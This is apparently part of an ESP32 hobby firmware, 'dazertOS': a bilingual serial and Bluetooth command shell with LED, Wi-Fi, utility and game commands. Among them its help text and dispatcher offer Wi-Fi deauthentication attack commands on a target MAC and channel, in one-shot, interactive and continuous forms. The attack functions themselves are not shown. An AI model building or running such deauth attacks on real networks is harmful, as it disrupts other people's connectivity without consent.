void printHelp() {
  LangStrings& lang = (currentLang == "ru") ? langRu : langEn;
  out.println();
  printLogo();
  out.println("\n---[ " + lang.help + " ]---");
  out.println("  help               - " + String(currentLang == "ru" ? "Показать этот список" : "Show this list"));
  out.println("  sys_info           - " + lang.sysInfo);
  out.println("  reboot             - " + String(currentLang == "ru" ? "Перезагрузить ESP32" : "Reboot ESP32"));
  out.println("  led_on / led_off   - " + String(currentLang == "ru" ? "Управление светодиодом" : "Control LED"));
  out.println("\n-- Wi-Fi " + String(currentLang == "ru" ? "и сеть" : "and network") + " --");
  out.println("  wifi_scan          - " + String(currentLang == "ru" ? "Сканировать Wi-Fi сети" : "Scan Wi-Fi networks"));
  out.println("  wifi_connect       - " + String(currentLang == "ru" ? "Подключиться к Wi-Fi сети" : "Connect to Wi-Fi network"));
  out.println("  wifi_status        - " + String(currentLang == "ru" ? "Показать статус Wi-Fi" : "Show Wi-Fi status"));
  out.println("  wifi_deauth <MAC> <channel> - " + String(currentLang == "ru" ? "Мощная атака (10000 пакетов)" : "Powerful attack (10000 packets)"));
  out.println("  wifi_deauth_interactive - " + String(currentLang == "ru" ? "Интерактивная атака (10000 пакетов)" : "Interactive attack (10000 packets)"));
  out.println("  wifi_deauth_continuous <MAC> <channel> - " + String(currentLang == "ru" ? "Непрерывная атака (до 'stop' или 90 сек)" : "Continuous attack (until 'stop' or 90 sec)"));
  out.println("  wifi_deauth_continuous_interactive - " + String(currentLang == "ru" ? "Интерактивная непрерывная атака" : "Interactive continuous attack"));
  out.println("  get_time           - " + String(currentLang == "ru" ? "Получить текущее время из интернета" : "Get current time from internet"));
  out.println("\n-- " + String(currentLang == "ru" ? "Утилиты и хранилище" : "Utilities and storage") + " --");
  out.println("  pass_gen <length>  - " + String(currentLang == "ru" ? "Сгенерировать пароль" : "Generate password"));
  out.println("  morse <text>       - " + String(currentLang == "ru" ? "Передать текст в коде Морзе через светодиод" : "Transmit text in Morse code via LED"));
  out.println("  calc <expression>  - " + String(currentLang == "ru" ? "Вычислить математическое выражение" : "Calculate mathematical expression"));
  out.println("  set_var <key> <value> - " + String(currentLang == "ru" ? "Сохранить переменную" : "Save variable") + " (e.g., set_var user Fedor)");
  out.println("  get_var <key>      - " + String(currentLang == "ru" ? "Прочитать сохранённую переменную" : "Read saved variable") + " (e.g., get_var user)");
  out.println("  set_lang <en|ru>   - " + String(currentLang == "ru" ? "Установить язык (en или ru)" : "Set language (en or ru)"));
  out.println("\n-- " + String(currentLang == "ru" ? "Игры" : "Games") + " --");
  out.println("  game_guess         - " + String(currentLang == "ru" ? "Игра 'Угадай число'" : "Number guessing game"));
  out.println("  game_tictactoe     - " + String(currentLang == "ru" ? "Игра 'Крестики-нолики'" : "Tic-Tac-Toe game"));
  out.println("------------------------------------");
}

void processCommand(String cmd) {
  LangStrings& lang = (currentLang == "ru") ? langRu : langEn;
  cmd.trim();
  String command = cmd;
  String arg = "";
  int spaceIndex = cmd.indexOf(' ');
  if (spaceIndex != -1) {
    command = cmd.substring(0, spaceIndex);
    arg = cmd.substring(spaceIndex + 1);
  }

  if (command == "help") printHelp();
  else if (command == "sys_info") printSystemInfo();
  else if (command == "led_on") ledOn();
  else if (command == "led_off") ledOff();
  else if (command == "reboot") { out.println(lang.reboot); delay(100); ESP.restart(); }
  else if (command == "wifi_scan") wifiScan();
  else if (command == "wifi_connect") interactiveWiFiConnect();
  else if (command == "wifi_status") wifiStatus();
  else if (command == "wifi_deauth") wifiDeauth(arg);
  else if (command == "wifi_deauth_interactive") wifiDeauthInteractive();
  else if (command == "wifi_deauth_continuous") wifiDeauthContinuous(arg);
  else if (command == "wifi_deauth_continuous_interactive") wifiDeauthContinuousInteractive();
  else if (command == "pass_gen") generatePassword(arg.toInt());
  else if (command == "morse") morseCommand(arg);
  else if (command == "calc") executeCalc(arg);
  else if (command == "game_guess") guessTheNumberGame();
  else if (command == "game_tictactoe") ticTacToeGame();
  else if (command == "get_time") getTimeOverNTP();
  else if (command == "set_var") setVar(arg);
  else if (command == "get_var") getVar(arg);
  else if (command == "set_lang") setLang(arg);
  else {
    out.printf(lang.unknownCommand.c_str(), command.c_str());
  }
}

void setup() {
  Serial.begin(115200);
  SerialBT.begin("dazertOS");
  
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, LOW);
  delay(1000);
  
  preferences.begin("dazert-os", false);
  currentLang = preferences.getString("language", "en"); // Default to English
  preferences.end();
  
  randomSeed(analogRead(0));
  
  printLogo();
  out.println("Enter 'help' for a list of commands.");
}

void loop() {
  out.print("\n> ");
  String command = readSerialLine();
  processCommand(command);
}
